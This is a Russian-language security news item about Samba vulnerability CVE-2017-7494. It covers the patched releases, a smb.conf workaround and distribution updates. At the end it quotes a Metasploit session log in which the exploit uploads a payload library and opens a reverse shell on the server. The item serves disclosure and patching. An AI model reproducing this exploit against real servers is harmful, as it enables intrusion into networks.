Уязвимость в Samba, позволяющая выполнить код на сервере

Опубликованы корректирующие обновления Samba 4.6.4, 4.5.10 и 4.4.14, в которых устранена критическая уязвимость (CVE-2017-7494), позволяющая организовать выполнение кода на сервере при наличии доступа на запись в предоставляемое сервером хранилище. Уязвимость позволяет клиенту загрузить разделяемую библиотеку на SMB-хранилище и инициировать её загрузку сервером. Проблема вызвана ошибкой в реализации IPC для именованных каналов для клиентов Windows NT. Уязвимости подвержены все версии Samba, начиная с 3.5.0, поэтому дополнительно подготовлены патчи для старых версий. В качестве обходного пути защиты можно добавить в параметр "nt pipe support = no" в секцию "[global]" smb.conf и перезапустить smbd. Обновления пакетов уже сформированы для FreeBSD, Debian, Fedora и RHEL. Проследить за выпуском обновлений пакетов в других дистрибутивах можно на данных страницах: Ubuntu, openSUSE, SUSE, CentOS. Дополнение: Подготовлен прототип эксплоита, позволяющий выполнить код с правами smbd (обычно root) при наличии доступа на запись в хранилище. Администраторам Samba-серверов рекомендуется не затягивать с установкой обновления, так как вероятно появление поддержки данного эксплоита во вредоносном ПО, поражающем локальные сети (например, машина неквалифицированного пользователя может быть взломана через уязвимость в браузере, PDF-просмотрщике или запуск пришедшего по почте троянского ПО, после чего через эту систему может быть атакован внутренний Samba-сервер). msf exploit(is_known_pipename) > exploit [*] Started reverse TCP handler on 192.168.0.3:4444 [*] 192.168.0.3:445 - Using location \\192.168.0.3\yarp\h for the path [*] 192.168.0.3:445 - Payload is stored in //192.168.0.3/yarp/h as GTithXJz.so [*] 192.168.0.3:445 - Trying location /tmp/yarp/h/GTithXJz.so... [*] Command shell session 6 opened (192.168.0.3:4444 -> 192.168.0.3:45076) at 2017-05-24 19:41:40 -0500 id uid=65534(nobody) gid=0(root) groups=0(root),65534(nogroup)